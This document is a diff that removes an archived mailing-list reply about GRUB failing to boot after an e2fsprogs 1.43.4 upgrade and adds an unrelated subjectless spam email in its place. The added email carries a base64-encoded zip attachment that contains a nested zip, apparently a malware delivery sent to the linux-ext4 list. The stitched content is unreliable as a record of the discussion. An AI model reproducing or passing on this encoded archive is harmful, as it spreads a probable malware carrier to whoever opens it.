@@ -1,200 +1,80 @@
-From: "Vladimir 'phcoder' Serbinenko" <phcoder@gmail.com>
-Subject: Re: Possible regression in e2fsprogs-1.43.4
-Date: Sat, 24 Jun 2017 21:31:38 +0000
-Message-ID: <CAEaD8JONcxwx8fCwjs5PswxkbF4xAQ9aR8NZ1JVad8NYRo=J+g@mail.gmail.com>
-References: <B2DFC17F-1CFC-410E-9449-2393D51C700B@illumenos.com>
-	<20170623195318.cfs4ftpmy5nhcccy@thunk.org>
-	<20170623232935.13fa4688@leda>
-	<048DD704-9937-4E2F-9BBD-2430CB734E2D@illumenos.com>
-Reply-To: The development of GNU GRUB <grub-devel@gnu.org>
+From: <nbensoncole81@yahoo.com.hk>
+Subject: (unknown)
+Date: Sun, 25 Jun 2017 05:19:48 -0000
+Message-ID: <149836798896.8929.14459294581814398225@zaural.ru>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============2762779052862317798=="
-Cc: linux-ext4@vger.kernel.org, Theodore Ts'o <tytso@mit.edu>
-To: The development of GNU GRUB <grub-devel@gnu.org>,
-	Christian Hesse <list@eworm.de>
-Return-path: <grub-devel-bounces+gcbgd-grub-devel=m.gmane.org@gnu.org>
-In-Reply-To: <048DD704-9937-4E2F-9BBD-2430CB734E2D@illumenos.com>
-List-Unsubscribe: <https://lists.gnu.org/mailman/options/grub-devel>,
-	<mailto:grub-devel-request@gnu.org?subject=unsubscribe>
-List-Archive: <http://lists.gnu.org/archive/html/grub-devel/>
-List-Post: <mailto:grub-devel@gnu.org>
-List-Help: <mailto:grub-devel-request@gnu.org?subject=help>
-List-Subscribe: <https://lists.gnu.org/mailman/listinfo/grub-devel>,
-	<mailto:grub-devel-request@gnu.org?subject=subscribe>
-Errors-To: grub-devel-bounces+gcbgd-grub-devel=m.gmane.org@gnu.org
-Sender: "Grub-devel" <grub-devel-bounces+gcbgd-grub-devel=m.gmane.org@gnu.org>
-List-Id: linux-ext4.vger.kernel.org
+Content-Type: application/zip; name="EMAIL_2726286_linux-ext4.zip"
+Content-Transfer-Encoding: base64
+To: <linux-ext4@vger.kernel.org>
+Return-path: <linux-ext4-owner@vger.kernel.org>
+Received: from ws63.zone31-163-132.zaural.ru ([31.163.132.63]:48112 "HELO
+        zaural.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751116AbdFYFTy (ORCPT <rfc822;linux-ext4@vger.kernel.org>);
+        Sun, 25 Jun 2017 01:19:54 -0400
+Content-Disposition: attachment
+Subject: 
+Sender: linux-ext4-owner@vger.kernel.org
+List-ID: <linux-ext4.vger.kernel.org>
 
---===============2762779052862317798==
-Content-Type: multipart/alternative; boundary="94eb2c0ef5980f27df0552bb724c"
-
---94eb2c0ef5980f27df0552bb724c
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
-
-=D1=81=D0=B1, 24 =D0=B8=D1=8E=D0=BD. 2017 =D0=B3., 23:22 Felipe A Rodriguez=
- <far@illumenos.com>:
-
-> On Jun 23, 2017, at 11:29 PM, Christian Hesse <list@eworm.de> wrote:
->
-> > Theodore Ts'o <tytso@mit.edu> on Fri, 2017/06/23 15:53:
-> >> +grub-devel
-> >>
-> >> On Sat, Jun 10, 2017 at 04:00:20PM +0200, Felipe A Rodriguez wrote:
-> >>> Upgrading from e2fsprogs-1.42.13 to e2fsprogs-1.43.4 causes the boot
-> >>> loader to fail (unknown filesystem error) on the x86_64 VM I use for
-> >>> initial testing.  I traced the problem to changes in the e2fsprogs
-> >>> configuration file which now sets 64 bit flags.  I tried upgrading
-> >>> to GRUB 2.02 but that did not resolve the problem.  Reverting the
-> >>> changes per the patch below fixes the problem.
-> >>
-> >> Hmm, my laptop has been using a file system with the 64-bit feature
-> >> enabled for quite some time, and my Debian Stretch system has been
-> >> using Grub 2.02 to boot my system without any difficulties.
-> >>
-> >> I've done a quick check of the Debian patches and none of them seem to
-> >> modify Grub's ext2/ext4 file system implementation.  So I don't know
-> >> what to tell you.  Are you sure you properly reinstalled grub on the
-> >> boot device after you upgraded to grub 2.02?
-> >
->
-> Yes.  I did not upgrade the test VM directly.  I replaced GRUB 2.00 with
-> 2.02 in my build automation which creates an installer ISO.  Installation
-> onto the VM is also largely automated.  GRUB 2.02 (and 2.00) work fine if=
- I
-> revert the config file to that in 1.42.13.
->
-Do you mean grub is unable to read some files ? Can you try, recreating it
-with grub-fstest? Can you upload failing image somewhere?
-
->
-> To be clear:  I don=E2=80=99t believe any of the code changes between 1.4=
-2.13 and
-> 1.43.4 cause this issue.  The problem arises from just the changes in the
-> built-in default configuration file that gets installed.  A distro that
-> uses its own custom configuration file may not encounter this issue.
->
->
-> > Grub should be fine, however syslinux still suffers issues with 64-bit
-> > feature. Possibly you use a chain to load syslinux first, grub second?
->
-> Yes, my test VM is configured to chain load GRUB from Syslinux
-> (ISOLINUX).  I don=E2=80=99t recall whether I tried booting directly into=
- GRUB so I
-> will test that tomorrow.
->
->
->
->
->
-> Regards,
->
-> Felipe
->
-> _______________________________________________
-> Grub-devel mailing list
-> Grub-devel@gnu.org
-> https://lists.gnu.org/mailman/listinfo/grub-devel
->
-
---94eb2c0ef5980f27df0552bb724c
-Content-Type: text/html; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
-
-<br><br><div class=3D"gmail_quote"><div dir=3D"ltr">=D1=81=D0=B1, 24 =D0=B8=
-=D1=8E=D0=BD. 2017 =D0=B3., 23:22 Felipe A Rodriguez &lt;<a href=3D"mailto:=
-far@illumenos.com">far@illumenos.com</a>&gt;:<br></div><blockquote class=3D=
-"gmail_quote" style=3D"margin:0 0 0 .8ex;border-left:1px #ccc solid;padding=
--left:1ex">On Jun 23, 2017, at 11:29 PM, Christian Hesse &lt;<a href=3D"mai=
-lto:list@eworm.de" target=3D"_blank">list@eworm.de</a>&gt; wrote:<br>
-<br>
-&gt; Theodore Ts&#39;o &lt;<a href=3D"mailto:tytso@mit.edu" target=3D"_blan=
-k">tytso@mit.edu</a>&gt; on Fri, 2017/06/23 15:53:<br>
-&gt;&gt; +grub-devel<br>
-&gt;&gt;<br>
-&gt;&gt; On Sat, Jun 10, 2017 at 04:00:20PM +0200, Felipe A Rodriguez wrote=
-:<br>
-&gt;&gt;&gt; Upgrading from e2fsprogs-1.42.13 to e2fsprogs-1.43.4 causes th=
-e boot<br>
-&gt;&gt;&gt; loader to fail (unknown filesystem error) on the x86_64 VM I u=
-se for<br>
-&gt;&gt;&gt; initial testing.=C2=A0 I traced the problem to changes in the =
-e2fsprogs<br>
-&gt;&gt;&gt; configuration file which now sets 64 bit flags.=C2=A0 I tried =
-upgrading<br>
-&gt;&gt;&gt; to GRUB 2.02 but that did not resolve the problem.=C2=A0 Rever=
-ting the<br>
-&gt;&gt;&gt; changes per the patch below fixes the problem.<br>
-&gt;&gt;<br>
-&gt;&gt; Hmm, my laptop has been using a file system with the 64-bit featur=
-e<br>
-&gt;&gt; enabled for quite some time, and my Debian Stretch system has been=
-<br>
-&gt;&gt; using Grub 2.02 to boot my system without any difficulties.<br>
-&gt;&gt;<br>
-&gt;&gt; I&#39;ve done a quick check of the Debian patches and none of them=
- seem to<br>
-&gt;&gt; modify Grub&#39;s ext2/ext4 file system implementation.=C2=A0 So I=
- don&#39;t know<br>
-&gt;&gt; what to tell you.=C2=A0 Are you sure you properly reinstalled grub=
- on the<br>
-&gt;&gt; boot device after you upgraded to grub 2.02?<br>
-&gt;<br>
-<br>
-Yes.=C2=A0 I did not upgrade the test VM directly.=C2=A0 I replaced GRUB 2.=
-00 with 2.02 in my build automation which creates an installer ISO.=C2=A0 I=
-nstallation onto the VM is also largely automated.=C2=A0 GRUB 2.02 (and 2.0=
-0) work fine if I revert the config file to that in 1.42.13.<br></blockquot=
-e></div><div>Do you mean grub is unable to read some files ? Can you try, r=
-ecreating it with grub-fstest? Can you upload failing image somewhere?</div=
-><div class=3D"gmail_quote"><blockquote class=3D"gmail_quote" style=3D"marg=
-in:0 0 0 .8ex;border-left:1px #ccc solid;padding-left:1ex">
-<br>
-To be clear:=C2=A0 I don=E2=80=99t believe any of the code changes between =
-1.42.13 and 1.43.4 cause this issue.=C2=A0 The problem arises from just the=
- changes in the built-in default configuration file that gets installed.=C2=
-=A0 A distro that uses its own custom configuration file may not encounter =
-this issue.<br>
-<br>
-<br>
-&gt; Grub should be fine, however syslinux still suffers issues with 64-bit=
-<br>
-&gt; feature. Possibly you use a chain to load syslinux first, grub second?=
-<br>
-<br>
-Yes, my test VM is configured to chain load GRUB from Syslinux (ISOLINUX).=
-=C2=A0 I don=E2=80=99t recall whether I tried booting directly into GRUB so=
- I will test that tomorrow.<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-Regards,<br>
-<br>
-Felipe<br>
-<br>
-_______________________________________________<br>
-Grub-devel mailing list<br>
-<a href=3D"mailto:Grub-devel@gnu.org" target=3D"_blank">Grub-devel@gnu.org<=
-/a><br>
-<a href=3D"https://lists.gnu.org/mailman/listinfo/grub-devel" rel=3D"norefe=
-rrer" target=3D"_blank">https://lists.gnu.org/mailman/listinfo/grub-devel</=
-a><br>
-</blockquote></div>
-
---94eb2c0ef5980f27df0552bb724c--
-
-
---===============2762779052862317798==
-Content-Type: text/plain; charset="us-ascii"
-MIME-Version: 1.0
-Content-Transfer-Encoding: 7bit
-Content-Disposition: inline
-
-_______________________________________________
-Grub-devel mailing list
-Grub-devel@gnu.org
-https://lists.gnu.org/mailman/listinfo/grub-devel
-
---===============2762779052862317798==--
+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
+AFBLBQYAAAAAAQABAE8AAABHDQAAAAA=
